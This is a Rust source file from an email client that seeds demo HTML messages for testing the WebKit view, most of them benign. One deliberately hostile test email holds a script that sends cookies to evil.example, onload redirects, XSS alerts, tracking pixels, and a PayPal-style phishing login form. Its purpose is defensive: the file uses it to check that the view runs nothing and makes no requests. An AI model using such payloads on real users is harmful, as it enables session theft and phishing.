//! Correos HTML de demostración (solo compilaciones de depuración, `CORREO_DEMO=1`).
//! Sirven para probar la vista completa (WebKit): maquetación con tablas, estilos en línea,
//! `<style>` con colores propios, citas anidadas y un correo hostil que no debe ejecutar nada
//! ni pedir red. Ver `docs/DEVELOPMENT.md`.

use correo_core::{Address, Flags, MailboxId, MessageBody, MessageHeader};
use correo_store::Store;

/// Un correo de demo: remitente, asunto, antigüedad en minutos y cuerpo HTML y de texto.
struct DemoMail {
    from: (&'static str, &'static str),
    subject: &'static str,
    snippet: &'static str,
    age_minutes: i64,
    html: &'static str,
    text: &'static str,
}

const NEWSLETTER: &str = r##"<!DOCTYPE html><html><head><meta charset="utf-8"><title>Boletín</title></head>
<body style="margin:0;padding:0;background-color:#f2f4f7;">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f2f4f7;">
<tr><td align="center" style="padding:24px 8px;">
 <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;background:#ffffff;border-radius:8px;">
  <tr><td style="background:#3584e4;padding:28px 32px;border-radius:8px 8px 0 0;">
    <h1 style="margin:0;font-family:Arial,sans-serif;font-size:26px;color:#ffffff;">Semanario del Taller</h1>
    <p style="margin:6px 0 0;font-family:Arial,sans-serif;font-size:14px;color:#dbe9fb;">Número 42 · octubre</p>
  </td></tr>
  <tr><td style="padding:0;"><img src="https://boletin.ejemplo.invalid/cabecera.jpg" width="600" height="180" alt="Foto de cabecera del taller" style="display:block;width:100%;height:auto;background:#cfd8e3;"></td></tr>
  <tr><td style="padding:28px 32px 8px;font-family:Arial,sans-serif;font-size:16px;line-height:24px;color:#333333;">
    <h2 style="margin:0 0 12px;font-size:20px;color:#1a1a1a;">Novedades de la semana</h2>
    <p style="margin:0 0 16px;">Hemos estrenado la <b>sala de impresión 3D</b> y abrimos inscripciones para el curso de
    electrónica básica. Estas son las cifras del mes:</p>
  </td></tr>
  <tr><td style="padding:0 32px 8px;">
    <table width="100%" cellpadding="0" cellspacing="0" style="font-family:Arial,sans-serif;font-size:15px;">
     <tr>
      <td width="50%" valign="top" style="padding:0 8px 16px 0;">
        <table width="100%" cellpadding="12" cellspacing="0" style="background:#eef5ff;border:1px solid #d3e3fb;border-radius:6px;">
          <tr><td><span style="font-size:28px;font-weight:bold;color:#1c71d8;">128</span><br><span style="color:#555;">socios activos</span></td></tr>
        </table>
      </td>
      <td width="50%" valign="top" style="padding:0 0 16px 8px;">
        <table width="100%" cellpadding="12" cellspacing="0" style="background:#fff6e5;border:1px solid #f6e0b0;border-radius:6px;">
          <tr><td><span style="font-size:28px;font-weight:bold;color:#c64600;">14</span><br><span style="color:#555;">talleres este mes</span></td></tr>
        </table>
      </td>
     </tr>
    </table>
  </td></tr>
  <tr><td align="center" style="padding:8px 32px 28px;">
    <a href="https://boletin.ejemplo.invalid/inscripcion" style="display:inline-block;background:#26a269;color:#ffffff;font-family:Arial,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:12px 28px;border-radius:6px;">Inscribirme al curso</a>
  </td></tr>
  <tr><td style="padding:16px 32px;border-top:1px solid #e6e6e6;font-family:Arial,sans-serif;font-size:12px;color:#888888;text-align:center;">
    Recibes este boletín porque te suscribiste en nuestra web.<br>
    <a href="https://boletin.ejemplo.invalid/baja" style="color:#888888;">Darme de baja</a> ·
    <a href="https://boletin.ejemplo.invalid/web" style="color:#888888;">Ver en el navegador</a>
  </td></tr>
 </table>
</td></tr></table>
</body></html>"##;

const INVOICE: &str = r##"<div style="font-family:Helvetica,Arial,sans-serif;color:#222;max-width:640px;">
<p style="font-size:16px;">Hola,</p>
<p style="font-size:16px;">Ya está disponible tu factura <b>F-2026-1042</b> del periodo de octubre. Este es el desglose:</p>
<table width="100%" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-size:15px;margin:16px 0;">
 <thead>
  <tr style="background:#f0f0f0;text-align:left;">
    <th style="border-bottom:2px solid #cccccc;">Concepto</th>
    <th style="border-bottom:2px solid #cccccc;text-align:right;">Uds.</th>
    <th style="border-bottom:2px solid #cccccc;text-align:right;">Importe</th>
  </tr>
 </thead>
 <tbody>
  <tr><td style="border-bottom:1px solid #e5e5e5;">Suscripción mensual</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">1</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">29,00 €</td></tr>
  <tr><td style="border-bottom:1px solid #e5e5e5;">Almacenamiento extra (50 GB)</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">2</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">9,98 €</td></tr>
  <tr><td style="border-bottom:1px solid #e5e5e5;">IVA (21 %)</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">&nbsp;</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">8,19 €</td></tr>
 </tbody>
 <tfoot>
  <tr><td colspan="2" style="text-align:right;font-weight:bold;padding-top:12px;">Total</td><td style="text-align:right;font-weight:bold;font-size:18px;padding-top:12px;">47,17 €</td></tr>
 </tfoot>
</table>
<p style="text-align:center;margin:24px 0;">
  <a href="https://facturas.ejemplo.net/pagar/F-2026-1042" style="background:#1c71d8;color:#ffffff;text-decoration:none;padding:12px 26px;border-radius:6px;font-weight:bold;display:inline-block;">Pagar factura</a>
</p>
<p style="font-size:13px;color:#777;">El cargo se realizará el día 5 en tu cuenta terminada en 4821. Si tienes dudas, responde a este correo.</p>
</div>"##;

const QUOTES: &str = r##"<div>
<p>Perfecto, entonces lo dejamos para el jueves a las 10:00.</p>
<p>Un abrazo,<br>Marta</p>
<div style="margin-top:12px;">El mié, 14 oct 2026 a las 18:02, Luis Gómez &lt;luis@ejemplo.org&gt; escribió:</div>
<blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
  <div>¿Os viene bien el jueves? Si no, podemos mover la reunión al viernes por la mañana.</div>
  <div style="margin-top:8px;">El mié, 14 oct 2026 a las 17:40, Ana Ruiz &lt;ana@ejemplo.com&gt; escribió:</div>
  <blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
    <div>Yo puedo el jueves o el viernes, como prefiráis. Adjunto el orden del día:</div>
    <ul><li>Presupuesto del trimestre</li><li>Calendario de entregas</li><li>Ruegos y preguntas</li></ul>
    <div style="margin-top:8px;">El mié, 14 oct 2026 a las 17:15, Marta Solé &lt;marta@ejemplo.com&gt; escribió:</div>
    <blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
      <div>Hola a todos, ¿cuándo quedamos para repasar las cifras?</div>
    </blockquote>
  </blockquote>
</blockquote>
</div>"##;

const DARK: &str = r##"<!DOCTYPE html><html><head><meta charset="utf-8">
<style>
  body { background:#0f1419; color:#e6e6e6; font-family:Georgia,serif; margin:0; }
  .wrap { max-width:560px; margin:0 auto; padding:28px 24px; }
  h1 { color:#7ee2b8; font-size:24px; letter-spacing:.5px; }
  .tarjeta { background:#1b2430; border-left:4px solid #7ee2b8; padding:14px 18px; border-radius:6px; margin:18px 0; }
  a.boton { display:inline-block; background:#7ee2b8; color:#0f1419; padding:10px 22px; border-radius:20px; text-decoration:none; font-weight:bold; }
  .pie { color:#8b97a5; font-size:13px; border-top:1px solid #2a3544; margin-top:28px; padding-top:12px; }
  @media (prefers-color-scheme: light) { .tarjeta { background:#e9fff6; } }
</style></head>
<body><div class="wrap">
  <h1>Modo noche activado</h1>
  <p>Este correo declara sus propios colores oscuros en una hoja de estilos: el fondo, el texto y las tarjetas
  no deben romperse dentro del lector.</p>
  <div class="tarjeta"><b>Resumen de tu semana</b><br>Has leído 42 correos y archivado 37. ¡Bandeja casi a cero!</div>
  <p><a class="boton" href="https://app.ejemplo.net/resumen">Ver resumen completo</a></p>
  <div class="pie">Enviado por Aurora Mail · <a href="https://app.ejemplo.net/baja" style="color:#7ee2b8;">cancelar suscripción</a></div>
</div></body></html>"##;

/// Puerto local del «rastreador»: el correo hostil lo referencia y la vista NO debe pedirlo.
const HOSTILE: &str = r##"<html><head><title>Aviso de seguridad</title>
<meta http-equiv="refresh" content="0; url=https://evil.example/redirect">
<base href="https://evil.example/">
<link rel="stylesheet" href="http://127.0.0.1:8099/hoja.css">
<script>document.location = 'https://evil.example/robo?c=' + document.cookie;</script>
</head>
<body onload="document.location='https://evil.example/onload'">
<h2 style="font-family:Arial,sans-serif;">Verifica tu cuenta ahora</h2>
<p style="font-family:Arial,sans-serif;">Hemos detectado un acceso inusual. Para evitar el bloqueo, confirma tus datos:</p>
<p><a href="https://evil.example" target="_blank">https://paypal.com</a></p>
<p><a href="javascript:alert('xss')">Pulsa aquí para verificar</a></p>
<iframe src="http://127.0.0.1:8099/marco.html" width="300" height="100"></iframe>
<object data="http://127.0.0.1:8099/objeto.swf"></object>
<embed src="http://127.0.0.1:8099/embed.swf">
<form action="https://evil.example/post" method="post">
  <input type="text" name="usuario" value="usuario"> <input type="password" name="clave">
  <button type="submit">Iniciar sesión</button>
</form>
<img src="http://127.0.0.1:8099/seguimiento.gif?id=demo" width="1" height="1" alt="">
<img src="https://rastreo.evil.example/pixel.gif" width="1" height="1" alt="">
<div style="width:200px;height:40px;background:url('http://127.0.0.1:8099/fondo.png');color:#900">Texto con fondo remoto</div>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>
</body></html>"##;

fn mails() -> Vec<DemoMail> {
    vec![
        DemoMail {
            from: ("Semanario del Taller", "boletin@ejemplo.net"),
            subject: "Boletín nº 42: sala de impresión 3D y nuevos cursos",
            snippet: "Hemos estrenado la sala de impresión 3D y abrimos inscripciones.",
            age_minutes: 2,
            html: NEWSLETTER,
            text: "Semanario del Taller, número 42.\n\nHemos estrenado la sala de impresión 3D.",
        },
        DemoMail {
            from: ("Equipo de Facturación", "facturas@ejemplo.net"),
            subject: "Factura F-2026-1042 disponible",
            snippet: "Ya está disponible tu factura del periodo de octubre.",
            age_minutes: 3,
            html: INVOICE,
            text: "Tu factura F-2026-1042 ya está disponible. Total: 47,17 EUR.",
        },
        DemoMail {
            from: ("Marta Solé", "marta@ejemplo.com"),
            subject: "Re: Re: Re: Reunión del jueves",
            snippet: "Perfecto, entonces lo dejamos para el jueves a las 10:00.",
            age_minutes: 4,
            html: QUOTES,
            text: "Perfecto, entonces lo dejamos para el jueves a las 10:00.",
        },
        DemoMail {
            from: ("Aurora Mail", "hola@aurora.example"),
            subject: "Tu resumen semanal (tema oscuro propio)",
            snippet: "Has leído 42 correos y archivado 37.",
            age_minutes: 5,
            html: DARK,
            text: "Resumen de tu semana: 42 correos leídos, 37 archivados.",
        },
        DemoMail {
            from: ("Seguridad de PayPal", "seguridad@paypa1-aviso.example"),
            subject: "URGENTE: verifica tu cuenta (correo hostil de prueba)",
            snippet: "Hemos detectado un acceso inusual en tu cuenta.",
            age_minutes: 6,
            html: HOSTILE,
            text: "Verifica tu cuenta ahora.",
        },
    ]
}

/// Inserta los correos HTML de demo en `mailbox` (UIDs 101 en adelante, ya leídos).
pub fn seed(store: &Store, mailbox: MailboxId, to_email: &str, now: i64) {
    let mails = mails();
    let headers: Vec<MessageHeader> = mails
        .iter()
        .enumerate()
        .map(|(i, m)| MessageHeader {
            id: 0,
            mailbox_id: mailbox,
            uid: 101 + i as u32,
            message_id: Some(format!("<demo-html-{i}@ejemplo.com>")),
            in_reply_to: None,
            references: Vec::new(),
            subject: m.subject.into(),
            from: vec![Address {
                name: Some(m.from.0.into()),
                email: m.from.1.into(),
            }],
            to: vec![Address {
                name: None,
                email: to_email.into(),
            }],
            cc: Vec::new(),
            date: now - m.age_minutes * 60,
            flags: Flags {
                seen: true,
                ..Flags::default()
            },
            has_attachments: false,
            snippet: Some(m.snippet.into()),
            labels: Vec::new(),
        })
        .collect();
    store
        .upsert_headers(mailbox, &headers)
        .expect("cabeceras demo HTML");
    for (i, m) in mails.iter().enumerate() {
        if let Ok(Some(id)) = store.message_id(mailbox, 101 + i as u32) {
            let _ = store.save_body(
                id,
                &MessageBody {
                    text: Some(m.text.into()),
                    html: Some(m.html.into()),
                    attachments: Vec::new(),
                },
            );
        }
    }
}
